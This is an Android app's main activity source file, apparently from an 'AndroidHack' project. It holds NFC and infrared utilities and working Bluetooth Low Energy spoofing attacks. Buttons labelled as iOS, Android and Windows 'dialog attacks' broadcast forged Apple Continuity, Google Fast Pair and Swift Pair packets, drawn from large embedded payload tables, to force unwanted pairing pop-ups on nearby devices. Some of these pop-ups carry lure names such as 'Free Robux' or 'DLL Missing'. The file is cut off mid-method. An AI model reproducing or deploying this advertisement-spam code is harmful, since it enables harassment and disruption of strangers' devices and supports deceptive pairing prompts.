package com.cfks.androidhack;

import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.le.AdvertiseData;
import android.bluetooth.le.AdvertisingSet;
import android.bluetooth.le.AdvertisingSetCallback;
import android.bluetooth.le.AdvertisingSetParameters;
import android.bluetooth.le.BluetoothLeAdvertiser;
import android.hardware.ConsumerIrManager;
import android.media.AudioFormat;
import android.media.AudioManager;
import android.media.AudioTrack;
import android.nfc.Tag;
import android.os.Build;
import android.os.Bundle;
import android.os.ParcelUuid;
import android.text.TextUtils;
import android.text.method.LinkMovementMethod;
import android.text.util.Linkify;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.cfks.androidhack.Helper;
import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Random;
import java.util.UUID;

import static android.content.ContentValues.TAG;
import static android.content.pm.PackageManager.PERMISSION_GRANTED;

public class MainActivity extends AppCompatActivity implements OnClickListener,NfcUtils.NfcListener {
    private ConsumerIrManager mCIR;
	private TextView MyFreqsText;
	private EditText infraredCode;
	private NfcUtils nfcUtils = NfcUtils.getInstance();
	private TextView NFCtext;
	private BluetoothLeAdvertiser bluetoothLeAdvertiser;
    private BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
    AdvertisingSet currentAdvertisingSet = null;
    public byte[][] deviceData = {
		/*1_AirPods*/{0x07, 0x19, 0x07, 0x02, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*2_AirPods Pro*/{0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*3_AirPods Max*/{0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*4_AirPods*/{0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*5_AirPods*/{0x07, 0x19, 0x07, 0x13, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*6_AirPods Pro*/{0x07, 0x19, 0x07, 0x14, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*7_Powerbeats3*/{0x07, 0x19, 0x07, 0x03, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*8_Powerbeats Pro*/{0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*9_Beats Solo Pro*/{0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*10_Beats Studio Buds*/{0x07, 0x19, 0x07, 0x11, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*11_Beats Flex*/{0x07, 0x19, 0x07, 0x10, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*12_BeatsX*/{0x07, 0x19, 0x07, 0x05, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*13_Beats Solo3*/{0x07, 0x19, 0x07, 0x06, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*14_Beats Studio3*/{0x07, 0x19, 0x07, 0x09, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*15_Beats Studio Pro*/{0x07, 0x19, 0x07, 0x17, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*16_Beats Fit Pro*/{0x07, 0x19, 0x07, 0x12, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*17_Beats Studio Buds +*/{0x07, 0x19, 0x07, 0x16, 0x20, 0x75, (byte) 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		/*18_设置AppleTV*/{0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x01, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
		/*19_配对AppleTV*/{0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x20, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
		/*20_AppleTV 验证AppleID*/{0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x2b, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
		/*21_AppleTV 隔空投放和HomeKit*/{0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x0d, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
		/*22_AppleTV键盘*/{0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x13, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
		/*23_正在连接AppleTV*/{0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x27, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
		/*24_HomePod*/{0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x0b, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
		/*25_设置新iPhone*/{0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x09, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
		/*26_转移手机号码*/{0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x02, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
		/*27_测量TV色彩平衡*/{0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, (byte) 0xc1, 0x1e, 0x60, 0x4c, (byte) 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
    };
	/*
	 public byte[][] deviceDataAndroid = {
	 {(byte)0x0001F0},
	 {0x000047},
	 {(byte)0x470000},
	 {0x00000A},
	 {(byte)0x0A0000},
	 {0x00000B},
	 {(byte)0x0B0000},
	 {(byte)0x0C0000},
	 {0x00000D},
	 {0x000007},
	 {(byte)0x070000},
	 {0x000008},
	 {(byte)0x080000},
	 {0x000009},
	 {(byte)0x090000},
	 {0x000035},
	 {(byte)0x350000},
	 {0x000048},
	 {(byte)0x480000},
	 {0x000049},
	 {(byte)0x490000},
	 {(byte)0x001000},
	 {(byte)0x00B727},
	 {(byte)0x01E5CE},
	 {(byte)0x0200F0},
	 {(byte)0x00F7D4},
	 {(byte)0xF00002},
	 {(byte)0xF00400},
	 {(byte)0x1E89A7},
	 };
	 */
	/*
	 public byte[][] deviceDataWindows = {
	 {(byte)0x030080224861636B2074686520706C616E657422},
	 };
	 */
    private int spIndex = 0;
    private int interval = 160;
    private int txPowerLevel = 1;
	Random random;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

		Toolbar toolbar=(Toolbar)findViewById(R.id.toolbar);
		setSupportActionBar(toolbar);

		MyFreqsText = findViewById(R.id.freqs_text);
		NFCtext = findViewById(R.id.NFCtext);
		infraredCode = findViewById(R.id.infraredCode);
		findViewById(R.id.get_freqs_button).setOnClickListener(this);
		findViewById(R.id.send1).setOnClickListener(this);
		findViewById(R.id.send2).setOnClickListener(this);
		findViewById(R.id.readNFC).setOnClickListener(this);
		findViewById(R.id.stopNFC).setOnClickListener(this);
		findViewById(R.id.iosDialogAttack).setOnClickListener(this);
		findViewById(R.id.androidDialogAttack).setOnClickListener(this);
		findViewById(R.id.windowsDialogAttack).setOnClickListener(this);

		TextView textView1 = findViewById(R.id.textView1);
		textView1.setLinksClickable(true);
		textView1.setAutoLinkMask(Linkify.WEB_URLS);
		textView1.setMovementMethod(LinkMovementMethod.getInstance());

		random = new Random(100);

		mCIR = (ConsumerIrManager) getSystemService(this.CONSUMER_IR_SERVICE);

		nfcUtils.setNfcListener(this);


		TextView tv = new TextView(this);
        tv.setText("声明：该软件仅用于学习和交流使用，作者不承担用户使用该软件的任何后果，使用该软件表示用户同意该声明。\n\n本项目Github开源地址:https://github.com/csjdyr001/AndroidHack");
        tv.setLinksClickable(true);
		tv.setAutoLinkMask(Linkify.WEB_URLS);
		tv.setMovementMethod(LinkMovementMethod.getInstance());
		new AlertDialog.Builder(this)
			.setTitle(R.string.app_name)
			.setView(tv)
			.setPositiveButton(android.R.string.ok, null)
			.setCancelable(false).show();
    }

	@Override
	public void onClick(View v) {
		switch (v.getId()) {
			case R.id.get_freqs_button:
				if (checkCIR(mCIR)) {
					StringBuilder content = new StringBuilder();
					//获取红外载波频率
					ConsumerIrManager.CarrierFrequencyRange[] frequencyRanges = mCIR.getCarrierFrequencies();
					content.append("红外信号接收数据:");
					for (ConsumerIrManager.CarrierFrequencyRange range:frequencyRanges) {
						content.append(String.format("  %d - %d\n",
													 range.getMinFrequency(), range.getMaxFrequency()));
					}
					MyFreqsText.setText(content.toString());
				} else {
					Toast.makeText(getApplication(), "你的设备不支持红外功能", Toast.LENGTH_SHORT).show();
				}
				break;
			case R.id.send1:
				if (checkCIR(mCIR)) {
					if (TextUtils.isEmpty(infraredCode.getText().toString())) {
						Toast.makeText(getApplication(), "红外代码不得为空", Toast.LENGTH_SHORT).show();
					} else {
						String data = null;
						data = hex2dec(infraredCode.getText().toString());
						String finallVal = count2duration(data);
						String values[] = finallVal.split(",");
						int frequency = Integer.parseInt(values[0]);
						int[] pattern = new int[values.length - 1];
						for (int i = 0; i < pattern.length; i++) {
							pattern[i] = Integer.parseInt(values[i + 1]);
						}
						if (isSupportedFrequency(mCIR, frequency)) {
							mCIR.transmit(frequency, pattern);
							Toast.makeText(getApplication(), "已发送红外编码", Toast.LENGTH_SHORT).show();
						} else {
							Toast.makeText(getApplication(), "你的设备不支持发送该频率的红外编码:" + frequency, Toast.LENGTH_SHORT).show();
						}
					}
				} else {
					Toast.makeText(getApplication(), "你的设备不支持红外功能", Toast.LENGTH_SHORT).show();
				}
				break;
			case R.id.send2:
				String data = null;
				data = hex2dec(infraredCode.getText().toString());
				String finallVal = count2duration(data);
				String values[] = finallVal.split(",");
				int frequency = Integer.parseInt(values[0]);
				int[] pattern = new int[values.length - 1];
				for (int i = 0; i < pattern.length; i++) {
					pattern[i] = Integer.parseInt(values[i + 1]);
				}
				infrared2audio(frequency, pattern);
				Toast.makeText(getApplication(), "已发送红外编码", Toast.LENGTH_SHORT).show();
				break;
			case R.id.readNFC:
				nfcUtils.onStartNfcAdapter(this);
				nfcUtils.onResumeNfcAdapter(this);//开始扫描NFC
				Toast.makeText(getApplication(), "开始扫描NFC", Toast.LENGTH_SHORT).show();
				break;
			case R.id.stopNFC:
				nfcUtils.onPauseNfcAdapter(this);
				Toast.makeText(getApplication(), "停止扫描NFC", Toast.LENGTH_SHORT).show();
				break;
			case R.id.iosDialogAttack:
				if (bluetoothAdapter != null && bluetoothAdapter.isEnabled()) {
					if (bluetoothAdapter.isMultipleAdvertisementSupported()) {
						bluetoothLeAdvertiser = bluetoothAdapter.getBluetoothLeAdvertiser();
						if (bluePermission()) {
							spIndex = random.nextInt(26);
							startAdv(0x004c,deviceData[spIndex]);
							if (currentAdvertisingSet != null) {
								Log.i("BLE", "device modify successful!");
								currentAdvertisingSet.setAdvertisingData(new AdvertiseData.Builder()
																		 .addManufacturerData(0x004c, deviceData[spIndex])
																		 .build());
							}
							stopAdv();
							Toast.makeText(getApplication(), "IOS弹窗攻击发送成功", Toast.LENGTH_SHORT).show();
						} else {
							Toast.makeText(getApplication(), "无权限，请授权后重试!", Toast.LENGTH_SHORT).show();
						}
					} else {
						Toast.makeText(this, "您的设备不支持BLE广播！错误代码：03", Toast.LENGTH_SHORT).show();
					}
				} else {
					Toast.makeText(this, "您的设备不支持蓝牙或没有蓝牙权限！错误代码：04", Toast.LENGTH_SHORT).show();
				}
				break;
			case R.id.androidDialogAttack:
				if (bluetoothAdapter != null && bluetoothAdapter.isEnabled()) {
					if (bluetoothAdapter.isMultipleAdvertisementSupported()) {
						bluetoothLeAdvertiser = bluetoothAdapter.getBluetoothLeAdvertiser();
						if (bluePermission()) {
							FastPairDevice[] devicesAndroid = new FastPairDevice[]{
								// Genuine non-production/forgotten (good job Google)
								new FastPairDevice("0x0001F0", "Bisto CSR8670 Dev Board"),
								new FastPairDevice("0x000047", "Arduino 101"),
								new FastPairDevice("0x470000", "Arduino 101 2"),
								new FastPairDevice("0x00000A", "Anti-Spoof Test"),
								new FastPairDevice("0x0A0000", "Anti-Spoof Test 2"),
								new FastPairDevice("0x00000B", "Google Gphones"),
								new FastPairDevice("0x0B0000", "Google Gphones 2"),
								new FastPairDevice("0x0C0000", "Google Gphones 3"),
								new FastPairDevice("0x00000D", "Test 00000D"),
								new FastPairDevice("0x000007", "Android Auto"),
								new FastPairDevice("0x070000", "Android Auto 2"),
								new FastPairDevice("0x000008", "Foocorp Foophones"),
								new FastPairDevice("0x080000", "Foocorp Foophones 2"),
								new FastPairDevice("0x000009", "Test Android TV"),
								new FastPairDevice("0x090000", "Test Android TV 2"),
								new FastPairDevice("0x000035", "Test 000035"),
								new FastPairDevice("0x350000", "Test 000035 2"),
								new FastPairDevice("0x000048", "Fast Pair Headphones"),
								new FastPairDevice("0x480000", "Fast Pair Headphones 2"),
								new FastPairDevice("0x000049", "Fast Pair Headphones 3"),
								new FastPairDevice("0x490000", "Fast Pair Headphones 4"),
								new FastPairDevice("0x001000", "LG HBS1110"),
								new FastPairDevice("0x00B727", "Smart Controller 1"),
								new FastPairDevice("0x01E5CE", "BLE-Phone"),
								new FastPairDevice("0x0200F0", "Goodyear"),
								new FastPairDevice("0x00F7D4", "Smart Setup"),
								new FastPairDevice("0xF00002", "Goodyear"),
								new FastPairDevice("0xF00400", "T10"),
								new FastPairDevice("0x1E89A7", "ATS2833_EVB"),
								// Phone setup
								new FastPairDevice("0x00000C", "Google Gphones Transfer"),
								new FastPairDevice("0x0577B1", "Galaxy S23 Ultra"),
								new FastPairDevice("0x05A9BC", "Galaxy S20+"),
								// Genuine devices
								new FastPairDevice("0xCD8256", "Bose NC 700"),
								new FastPairDevice("0x0000F0", "Bose QuietComfort 35 II"),
								new FastPairDevice("0xF00000", "Bose QuietComfort 35 II 2"),
								new FastPairDevice("0x821F66", "JBL Flip 6"),
								new FastPairDevice("0xF52494", "JBL Buds Pro"),
								new FastPairDevice("0x718FA4", "JBL Live 300TWS"),
								new FastPairDevice("0x0002F0", "JBL Everest 110GA"),
								new FastPairDevice("0x92BBBD", "Pixel Buds"),
								new FastPairDevice("0x000006", "Google Pixel buds"),
								new FastPairDevice("0x060000", "Google Pixel buds 2"),
								new FastPairDevice("0xD446A7", "Sony XM5"),
								new FastPairDevice("0x2D7A23", "Sony WF-1000XM4"),
								new FastPairDevice("0x0E30C3", "Razer Hammerhead TWS"),
								new FastPairDevice("0x72EF8D", "Razer Hammerhead TWS X"),
								new FastPairDevice("0x72FB00", "Soundcore Spirit Pro GVA"),
								new FastPairDevice("0x0003F0", "LG HBS-835S"),
								new FastPairDevice("0x002000", "AIAIAI TMA-2 (H60)"),
								new FastPairDevice("0x003000", "Libratone Q Adapt On-Ear"),
								new FastPairDevice("0x003001", "Libratone Q Adapt On-Ear 2"),
								new FastPairDevice("0x00A168", "boAt Airdopes 621"),
								new FastPairDevice("0x00AA48", "Jabra Elite 2"),
								new FastPairDevice("0x00AA91", "Beoplay E8 2.0"),
								new FastPairDevice("0x00C95C", "Sony WF-1000X"),
								new FastPairDevice("0x01EEB4", "WH-1000XM4"),
								new FastPairDevice("0x02AA91", "B&O Earset"),
								new FastPairDevice("0x01C95C", "Sony WF-1000X"),
								new FastPairDevice("0x02D815", "ATH-CK1TW"),
								new FastPairDevice("0x035764", "PLT V8200 Series"),
								new FastPairDevice("0x038CC7", "JBL TUNE760NC"),
								new FastPairDevice("0x02DD4F", "JBL TUNE770NC"),
								new FastPairDevice("0x02E2A9", "TCL MOVEAUDIO S200"),
								new FastPairDevice("0x035754", "Plantronics PLT_K2"),
								new FastPairDevice("0x02C95C", "Sony WH-1000XM2"),
								new FastPairDevice("0x038B91", "DENON AH-C830NCW"),
								new FastPairDevice("0x02F637", "JBL LIVE FLEX"),
								new FastPairDevice("0x02D886", "JBL REFLECT MINI NC"),
								new FastPairDevice("0xF00000", "Bose QuietComfort 35 II"),
								new FastPairDevice("0xF00001", "Bose QuietComfort 35 II"),
								new FastPairDevice("0xF00201", "JBL Everest 110GA"),
								new FastPairDevice("0xF00204", "JBL Everest 310GA"),
								new FastPairDevice("0xF00209", "JBL LIVE400BT"),
								new FastPairDevice("0xF00205", "JBL Everest 310GA"),
								new FastPairDevice("0xF00200", "JBL Everest 110GA"),
								new FastPairDevice("0xF00208", "JBL Everest 710GA"),
								new FastPairDevice("0xF00207", "JBL Everest 710GA"),
								new FastPairDevice("0xF00206", "JBL Everest 310GA"),
								new FastPairDevice("0xF0020A", "JBL LIVE400BT"),
								new FastPairDevice("0xF0020B", "JBL LIVE400BT"),
								new FastPairDevice("0xF0020C", "JBL LIVE400BT"),
								new FastPairDevice("0xF00203", "JBL Everest 310GA"),
								new FastPairDevice("0xF00202", "JBL Everest 110GA"),
								new FastPairDevice("0xF00213", "JBL LIVE650BTNC"),
								new FastPairDevice("0xF0020F", "JBL LIVE500BT"),
								new FastPairDevice("0xF0020E", "JBL LIVE500BT"),
								new FastPairDevice("0xF00214", "JBL LIVE650BTNC"),
								new FastPairDevice("0xF00212", "JBL LIVE500BT"),
								new FastPairDevice("0xF0020D", "JBL LIVE400BT"),
								new FastPairDevice("0xF00211", "JBL LIVE500BT"),
								new FastPairDevice("0xF00215", "JBL LIVE650BTNC"),
								new FastPairDevice("0xF00210", "JBL LIVE500BT"),
								new FastPairDevice("0xF00305", "LG HBS-1500"),
								new FastPairDevice("0xF00304", "LG HBS-1010"),
								new FastPairDevice("0xF00308", "LG HBS-1125"),
								new FastPairDevice("0xF00303", "LG HBS-930"),
								new FastPairDevice("0xF00306", "LG HBS-1700"),
								new FastPairDevice("0xF00300", "LG HBS-835S"),
								new FastPairDevice("0xF00309", "LG HBS-2000"),
								new FastPairDevice("0xF00302", "LG HBS-830"),
								new FastPairDevice("0xF00307", "LG HBS-1120"),
								new FastPairDevice("0xF00301", "LG HBS-835"),
								new FastPairDevice("0xF00E97", "JBL VIBE BEAM"),
								new FastPairDevice("0x04ACFC", "JBL WAVE BEAM"),
								new FastPairDevice("0x04AA91", "Beoplay H4"),
								new FastPairDevice("0x04AFB8", "JBL TUNE 720BT"),
								new FastPairDevice("0x05A963", "WONDERBOOM 3"),
								new FastPairDevice("0x05AA91", "B&O Beoplay E6"),
								new FastPairDevice("0x05C452", "JBL LIVE220BT"),
								new FastPairDevice("0x05C95C", "Sony WI-1000X"),
								new FastPairDevice("0x0602F0", "JBL Everest 310GA"),
								new FastPairDevice("0x0603F0", "LG HBS-1700"),
								new FastPairDevice("0x1E8B18", "SRS-XB43"),
								new FastPairDevice("0x1E955B", "WI-1000XM2"),
								new FastPairDevice("0x1EC95C", "Sony WF-SP700N"),
								new FastPairDevice("0x1ED9F9", "JBL WAVE FLEX"),
								new FastPairDevice("0x1EE890", "ATH-CKS30TW WH"),
								new FastPairDevice("0x1EEDF5", "Teufel REAL BLUE TWS 3"),
								new FastPairDevice("0x1F1101", "TAG Heuer Calibre E4 45mm"),
								new FastPairDevice("0x1F181A", "LinkBuds S"),
								new FastPairDevice("0x1F2E13", "Jabra Elite 2"),
								new FastPairDevice("0x1F4589", "Jabra Elite 2"),
								new FastPairDevice("0x1F4627", "SRS-XG300"),
								new FastPairDevice("0x1F5865", "boAt Airdopes 441"),
								new FastPairDevice("0x1FBB50", "WF-C700N"),
								new FastPairDevice("0x1FC95C", "Sony WF-SP700N"),
								new FastPairDevice("0x1FE765", "TONE-TF7Q"),
								new FastPairDevice("0x1FF8FA", "JBL REFLECT MINI NC"),
								new FastPairDevice("0x201C7C", "SUMMIT"),
								new FastPairDevice("0x202B3D", "Amazfit PowerBuds"),
								new FastPairDevice("0x20330C", "SRS-XB33"),
								new FastPairDevice("0x003B41", "M&D MW65"),
								new FastPairDevice("0x003D8B", "Cleer FLOW II"),
								new FastPairDevice("0x005BC3", "Panasonic RP-HD610N"),
								new FastPairDevice("0x008F7D", "soundcore Glow Mini"),
								new FastPairDevice("0x00FA72", "Pioneer SE-MS9BN"),
								new FastPairDevice("0x0100F0", "Bose QuietComfort 35 II"),
								new FastPairDevice("0x011242", "Nirvana Ion"),
								new FastPairDevice("0x013D8B", "Cleer EDGE Voice"),
								new FastPairDevice("0x01AA91", "Beoplay H9 3rd Generation"),
								new FastPairDevice("0x038F16", "Beats Studio Buds"),
								new FastPairDevice("0x039F8F", "Michael Kors Darci 5e"),
								new FastPairDevice("0x03AA91", "B&O Beoplay H8i"),
								new FastPairDevice("0x03B716", "YY2963"),
								new FastPairDevice("0x03C95C", "Sony WH-1000XM2"),
								new FastPairDevice("0x03C99C", "MOTO BUDS 135"),
								new FastPairDevice("0x03F5D4", "Writing Account Key"),
								new FastPairDevice("0x045754", "Plantronics PLT_K2"),
								new FastPairDevice("0x045764", "PLT V8200 Series"),
								new FastPairDevice("0x04C95C", "Sony WI-1000X"),
								new FastPairDevice("0x050F0C", "Major III Voice"),
								new FastPairDevice("0x052CC7", "MINOR III"),
								new FastPairDevice("0x057802", "TicWatch Pro 5"),
								new FastPairDevice("0x0582FD", "Pixel Buds"),
								new FastPairDevice("0x058D08", "WH-1000XM4"),
								new FastPairDevice("0x06AE20", "Galaxy S21 5G"),
								new FastPairDevice("0x06C197", "OPPO Enco Air3 Pro"),
								new FastPairDevice("0x06C95C", "Sony WH-1000XM2"),
								new FastPairDevice("0x06D8FC", "soundcore Liberty 4 NC"),
								new FastPairDevice("0x0744B6", "Technics EAH-AZ60M2"),
								new FastPairDevice("0x07A41C", "WF-C700N"),
								new FastPairDevice("0x07C95C", "Sony WH-1000XM2"),
								new FastPairDevice("0x07F426", "Nest Hub Max"),
								new FastPairDevice("0x0102F0", "JBL Everest 110GA - Gun Metal"),
								new FastPairDevice("0x0202F0", "JBL Everest 110GA - Silver"),
								new FastPairDevice("0x0302F0", "JBL Everest 310GA - Brown"),
								new FastPairDevice("0x0402F0", "JBL Everest 310GA - Gun Metal"),
								new FastPairDevice("0x0502F0", "JBL Everest 310GA - Silver"),
								new FastPairDevice("0x0702F0", "JBL Everest 710GA - Gun Metal"),
								new FastPairDevice("0x0802F0", "JBL Everest 710GA - Silver"),
								new FastPairDevice("0x054B2D", "JBL TUNE125TWS"),
								new FastPairDevice("0x0660D7", "JBL LIVE770NC"),
								new FastPairDevice("0x0103F0", "LG HBS-835"),
								new FastPairDevice("0x0203F0", "LG HBS-830"),
								new FastPairDevice("0x0303F0", "LG HBS-930"),
								new FastPairDevice("0x0403F0", "LG HBS-1010"),
								new FastPairDevice("0x0503F0", "LG HBS-1500"),
								new FastPairDevice("0x0703F0", "LG HBS-1120"),
								new FastPairDevice("0x0803F0", "LG HBS-1125"),
								new FastPairDevice("0x0903F0", "LG HBS-2000"),
								// Custom debug popups
								new FastPairDevice("0xD99CA1", "Flipper Zero"),
								new FastPairDevice("0x77FF67", "Free Robux"),
								new FastPairDevice("0xAA187F", "Free VBucks"),
								new FastPairDevice("0xDCE9EA", "Rickroll"),
								new FastPairDevice("0x87B25F", "Animated Rickroll"),
								new FastPairDevice("0xF38C02", "Boykisser"),
								new FastPairDevice("0x1448C9", "BLM"),
								new FastPairDevice("0xD5AB33", "Xtreme"),
								new FastPairDevice("0x0C0B67", "Xtreme Cta"),
								new FastPairDevice("0x13B39D", "Talking Sasquach"),
								new FastPairDevice("0xAA1FE1", "ClownMaster"),
								new FastPairDevice("0x7C6CDB", "Obama"),
								new FastPairDevice("0x005EF9", "Ryanair"),
								new FastPairDevice("0xE2106F", "FBI"),
								new FastPairDevice("0xB37A62", "Tesla")
							};
							ParcelUuid serviceUUID = new ParcelUuid(UUID.fromString("0000FE2C-0000-1000-8000-00805F9B34FB"));
							spIndex = random.nextInt(devicesAndroid.length);
							byte[] serviceData = Helper.convertHexToByteArray(devicesAndroid[spIndex].getValue());
							AdvertiseData advData = new AdvertiseData.Builder()
								//.addManufacturerData(0xFE2C, deviceDataAndroid[spIndex])
								.addServiceData(serviceUUID, serviceData)
								.addServiceUuid(serviceUUID)
								.setIncludeTxPowerLevel(true)
								.build();
							startAdv(advData);
							if (currentAdvertisingSet != null) {
								Log.i("BLE", "device modify successful!");
								currentAdvertisingSet.setAdvertisingData(advData);
							}
							stopAdv();
							Toast.makeText(getApplication(), "Android弹窗攻击发送成功", Toast.LENGTH_SHORT).show();
						} else {
							Toast.makeText(getApplication(), "无权限，请授权后重试!", Toast.LENGTH_SHORT).show();
						}
					} else {
						Toast.makeText(this, "您的设备不支持BLE广播！错误代码：03", Toast.LENGTH_SHORT).show();
					}
				} else {
					Toast.makeText(this, "您的设备不支持蓝牙或没有蓝牙权限！错误代码：04", Toast.LENGTH_SHORT).show();
				}
				break;
			case R.id.windowsDialogAttack:
				if (bluetoothAdapter != null && bluetoothAdapter.isEnabled()) {
					if (bluetoothAdapter.isMultipleAdvertisementSupported()) {
						bluetoothLeAdvertiser = bluetoothAdapter.getBluetoothLeAdvertiser();
						if (bluePermission()) {
							try {
								String[] devices = new String[]{"Windows Protocol", "DLL Missing", "Download Windows 12"};
								spIndex = random.nextInt(devices.length);
								ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
								outputStream.write(Helper.convertHexToByteArray("030080"));
								outputStream.write(devices[spIndex].getBytes(StandardCharsets.UTF_8));
								startAdv(0x0006,outputStream.toByteArray());//deviceDataWindows[spIndex]);
								if (currentAdvertisingSet != null) {
									Log.i("BLE", "device modify successful!");
									currentAdvertisingSet.setAdvertisingData(new AdvertiseData.Builder()
																			 .addManufacturerData(0x0006, outputStream.toByteArray())//deviceDataWindows[spIndex])
																			 .build());
								}
								stopAdv();
								Toast.makeText(getApplication(), "Windows弹窗攻击发送成功", Toast.LENGTH_SHORT).show();
							} catch (Exception e) {
								Toast.makeText(getApplication(), e.toString(), Toast.LENGTH_SHORT).show();
							}
